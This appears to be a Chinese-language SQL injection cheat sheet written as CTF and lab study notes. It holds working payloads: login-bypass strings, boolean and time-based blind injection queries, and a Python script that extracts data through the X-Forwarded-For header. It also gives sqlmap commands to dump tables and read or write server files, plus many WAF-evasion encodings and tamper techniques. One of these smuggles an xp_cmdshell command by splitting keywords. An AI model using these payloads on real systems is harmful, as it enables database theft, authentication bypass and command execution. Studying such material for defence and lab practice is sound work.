## 练习
sqllab
## sql特性
### sql里面弱类型的比较，以下情况都会为true：

- 1='1'
- 1='1.0'
- 1='1后接字母(再后面有数字也可以)'
- 0='除了 非0数字 开头 的字符串'
  
    uname=admin
    &passwd=admin'||'1'='1
## 注入

常用函数：
```
version() 数据库版本
@@datadir 数据库路径
@@version_compile_os
user()
database() 数据库名称
system_user() 系统用户名
current_user() 当前用户名
session_user() 连接数据库的用户名
floor() 取整
rand() 随机0-1
concat("abc","123")=abc123
concat("abc",0x22,"123")=abc"123
```
### 万能密码
`'or 1#`  
其他待补充 

### 手工注入

```sql
select sleep(if(length(@@version)=6,20,0));
--长度为6 sleep 2秒，否则0秒。

select sleep(if(ord(mid((select user()),1,1))<150,0,2));
and exists(select * from admin) 
--说明存在表admin

admin and exists(select admin from admin) 
--说明存在admin列

and (select length(username) from admin limit 1)>0 
--猜解数据库列名长度：修改后面的>0是猜解长度 

and (select top 1 ascii(substring(username 1,1)) from admin)>0 
--猜解内容：猜解出的内容需对应ASCII表,ascii、substring为MySQL的函数，MsSQL略有不同
ORDER BY num
--爆字段长度
and 1=1 union select 1,2,3,4...n
--匹配字段:
group_concat()
--函数让检索出来的语句以行的形式显示。如果不用这个函数，就不会看到输出结果。 

```
### 延时注入
```py
import requests
import string

s=requests.session()
url="http://ctf5.shiyanbar.com/web/wonderkun/index.php"

flag=''
guess=string.lowercase+string.uppercase+string.digits
for i in range(33):
    for st in guess:
        headers={"x-forwarded-for":"1'+"+"(select case when(substr((select flag from flag) from %d for 1)='%s') then sleep(5) else 1 end) and '1'='1" %(i,st)}
        try:
          res=s.get(url,headers=headers,timeout=4)
        except requests.exceptions.ReadTimeout:
            flag+=st
    print "flag:",flag
    break
print "result:"+flag
```

### sqlmap  

`-dbs -v 0  -dbs`, 根据不同的数据库管理平台探测包含的数据库名称    
`-D dvwa --tables` 根据数据库dvwa查找表名    
`-D dvwa --tables -T users --columns` 查找dvwa数据库中的users表中的字段列表    
`-D dvwa --tables -T users --columns --dump ` 字段内容  

#### post注入
```bash
sqlmap -u http://xxx.asp --data"id=114" --level 3
```

#### cookie注入

```bash
sqlmap -u http://xxx.asp --cookie "id=114" --level 2
```

- `--tables` 爆表
- `-T 表名 --columns` 爆字段
- `-T 表名 -C 字段名 -C" "` --dump
- `--file-read 文件` 读取文件
- `--file-write 本地文件 --file-dest 目标目录`写入文件
## waf绕过

1. url编码
```
?id=1 union select pass from admin limit 1
?id=1%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%70%61%73%73%20%66%72%6f%6d%20%61%64%6d%69%6e%20%6c%69%6d%69%74%20%31
```

2. Unicode编码

```
'e' => '%u0065', //这是他的Unicode 编码
?id=1 union select pass from admin limit 1
?id=1 un%u0069on sel%u0065ct pass f%u0072om admin li%u006dit 1
```
3. 反注释
```
/*!30000union all select (select distinct concat(0x7e,0x27,unhex(Hex(cast(schema_name as char))),0x27,0x7e) from `information_schema`.schemata limit 10,1),null,null,null,null*/--
```
4. 加%
```
newsid=60+a%nd%201=(se%lect%20@@VERSION)--
newsid=60+a%nd%201=(se%lect%20@@servername)--
```

5. NULL字节
```
xx.asp?0day5.com=%00.&xw_id=69%20 and 1=1和xx.asp?0day5.com=%00.&xw_id=69%20 and 1=2
```
6. 关键字拆分
```
cnseay.com/1.aspx?id=1;EXEC('ma'+'ster..x'+'p_cm'+'dsh'+'ell "net user"')
```
### sqlmap 自带的绕过脚本 --tamper详解  
```
(1) apostrophemask.py UTF-8编码 
Example: 
Input: AND '1'='1' 
Output: AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87 

(2) apostrophenullencode.py unicode编码 
Example: 
Input: AND '1'='1' 
Output: AND %00%271%00%27=%00%271%00%27 

(3) appendnullbyte.py 添加%00   
Example:  
Input: AND 1=1  
Output: AND 1=1%00  
Requirement:  
Microsoft Access  

(4) base64encode.py base64编码 
Example: 
Input: 1' AND SLEEP(5)# 
Output: MScgQU5EIFNMRUVQKDUpIw` 

(5) between.py 以”not between”替换”>“ 
Example: 
Input: 'A > B' 
Output: 'A NOT BETWEEN 0 AND B' 

(6) bluecoat.py 以随机的空白字符替代空格，以”like”替代”=“ 
Example: 
Input: SELECT id FROM users where id = 1 
Output: SELECT%09id FROM users where id LIKE 1 
Requirement: 
MySQL 5.1, SGOS 

(7) chardoubleencode.py 双重url编码 
Example: 
Input: SELECT FIELD FROM%20TABLE 
Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545

(8) charencode.py url编码 
Example: 
Input: SELECT FIELD FROM%20TABLE 
Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45

(9) charunicodeencode.py 对未进行url编码的字符进行unicode编码 
Example: 
Input: SELECT FIELD%20FROM TABLE 
Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045'
Requirement: 
ASP 
ASP.NET 

(10) equaltolike.py 以”like”替代”=“ 
Example: 
Input: SELECT FROM users WHERE id=1 
Output: SELECT FROM users WHERE id LIKE 1 

(11) halfversionedmorekeywords.py在每个关键字前添加条件注释 
Example: 
Input: value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa 
Output: value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND 'QDWa'='QDWa 
Requirement: 
MySQL < 5.1 

(12) ifnull2ifisnull.py 以”IF(ISNULL(A), B, A)”替换”IFNULL(A, B)” 
Example: 
Input: IFNULL(1, 2) 
Output: IF(ISNULL(1), 2, 1) 
Requirement: 
MySQL 
SQLite (possibly) 
SAP MaxDB (possibly) 

(13) modsecurityversioned.py 条件注释 
Example: 
Input: 1 AND 2>1-- 
Output: 1 /*!30000AND 2>1*/-- 
Requirement: 
MySQL 

(14) modsecurityzeroversioned.py 条件注释，0000 
Example: 
Input: 1 AND 2>1-- 
Output: 1 /*!00000AND 2>1*/-- 
Requirement: 
MySQL 

(15) multiplespaces.py 添加多个空格 
Example: 
Input: UNION SELECT 
Output:  UNION   SELECT 

(16) nonrecursivereplacement.py 可以绕过对关键字删除的防注入（这个我也不知道怎么说好，看例子。。。） 
Example: 
Input: 1 UNION SELECT 2-- 
Output: 1 UNUNIONION SELSELECTECT 2-- 

(17) percentage.py 在每个字符前添加百分号（%） 
Example: 
Input: SELECT FIELD FROM TABLE 
Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E 
Requirement: 
ASP 

(18) randomcase.py 随即大小写 
Example: 
Input: INSERT 
Output: InsERt 

(19) randomcomments.py 随机插入区块注释 
Example: 
'INSERT' becomes 'IN/**/S/**/ERT' 
securesphere.py 语句结尾添加”真”字符串 
Example: 
Input: AND 1=1 
Output: AND 1=1 and '0having'='0having' 

(20) sp_password.py 语句结尾添加”sp_password”迷惑数据库日志 
Example: www.2cto.com 
Input: 1 AND 9227=9227-- 
Output: 1 AND 9227=9227--sp_password 
Requirement: 
MSSQL 

(21) space2comment.py 以区块注释替换空格 
Example: 
Input: SELECT id FROM users 
Output: SELECT/**/id/**/FROM/**/users 

(22) space2dash.py 以单行注释”--”和随机的新行替换空格 
Example: 
Input: 1 AND 9227=9227 
Output: 1--PTTmJopxdWJ%0AAND--cWfcVRPV%0A9227=9227 
Requirement: 
MSSQL 
SQLite 

(23) space2hash.py 以单行注释”#”和由随机字符组成的新行替换空格 
Example: 
Input: 1 AND 9227=9227 
Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227 
Requirement: 
MySQL 


(25) space2mssqlblank.py 以随机空白字符替换空格 
Example: 
Input: SELECT id FROM users 
Output: SELECT%08id%02FROM%0Fusers 
Requirement: 
Microsoft SQL Server 

(26) space2mssqlhash.py 以单行注释”#”和新行替换空格 
Example: 
Input: 1 AND 9227=9227 
Output: 1%23%0A9227=9227 
Requirement: 
MSSQL 
MySQL 

(27) space2mysqlblank.py 以随机空白字符替换空格 
Example: 
Input: SELECT id FROM users 
Output: SELECT%0Bid%0BFROM%A0users 
Requirement: 
MySQL 

(28) space2mysqldash.py 以单行注释和新行替换空格 
Example: 
Input: 1 AND 9227=9227 
Output: 1--%0AAND--%0A9227=9227 
Requirement: 
MySQL 
MSSQL 

(29) space2plus.py 以”+”替换空格 
Example: 
Input: SELECT id FROM users 
Output: SELECT+id+FROM+users 

(30) space2randomblank.py 随机空白字符替换空格 
Example: 
Input: SELECT id FROM users 
Output: SELECT\rid\tFROM\nusers 

(31) unionalltounion.py 以”union all”替换”union” 
Example: 
Input: -1 UNION ALL SELECT 
Output: -1 UNION SELECT 

(32) unmagicquotes.py 以”%bf%27”替换单引号，并在结尾添加注释”--” 
Example: 
Input: 1' AND 1=1 
Output: 1%bf%27 AND 1=1--%20 

(33)versionedkeywords.py 对不是函数的关键字条件注释 
Example: 
Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# 
Output:  1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#
Requirement: 
MySQL 


(34) versionedmorekeywords.py 对关键字条件注释 
Example: 
Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# 
Output: 1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))
```

## 绕过
https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI

sql注入绕行waf:；POST ，cookie中转,大小写混合，替换关键字，使用编码(16进制，hex编码)，使用注释，等价函数和命令，使用特殊符号，http参数控制，pwn ,select \`version()\` %0A,%20
sel%00ect,%20=>空格,/!**/ => 空格 异常method，`~ ！+ -`连接符

### 双等号绕过
username=p'='&password=p'='  

### 截断
username=a'+0;%00&password=


## 其他

1. 域传送:dnsenum -enum xxx.com 检测域传送
2. http://www.dmzlab.com/77396.html  
3. 宽字符注入：'aaa%df' WHERE 1=1 --' 